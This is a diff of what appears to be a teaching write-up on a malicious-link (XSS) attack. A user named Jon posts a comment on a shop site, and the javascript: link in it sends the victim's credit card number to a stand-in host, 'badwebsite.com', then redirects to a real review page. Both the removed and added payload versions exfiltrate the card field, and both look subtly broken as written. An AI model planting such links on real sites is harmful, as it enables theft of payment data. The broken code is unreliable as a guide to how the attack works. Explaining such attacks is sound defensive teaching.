@@ -73,10 +73,13 @@ Jon devises a plan to craft a malicious link to put in his BuyStuffNow comment. 
 
 The link will be constructed as such:
 
-`
-<a href="javascript:console.log(new XMLHttpRequest().open('POST',
-'http://badwebsite.com').send(document.querySelector('creditCardInfo'));
-window.open('http://www.legitreview.com/product');">this</a>`
+`<a href="javascript:console.log(
+$.ajax({type: 'POST', context: this, url: 'http://www.badwebsite.com', data: {
+cardNumber: document.querySelector('#creditCardNumber')},
+dataType: 'text',
+success: function(resultData) { window.location.open('http://www.legitreview.com/product'); }
+})
+)">this</a>`
 
 To a uneducated user, this is simply a link to a legitimate review on another website. The user may enter their credit card information and than decide to read the review - in which case their credit card information is sent to a malicious web server and stored for malicious uses.
 
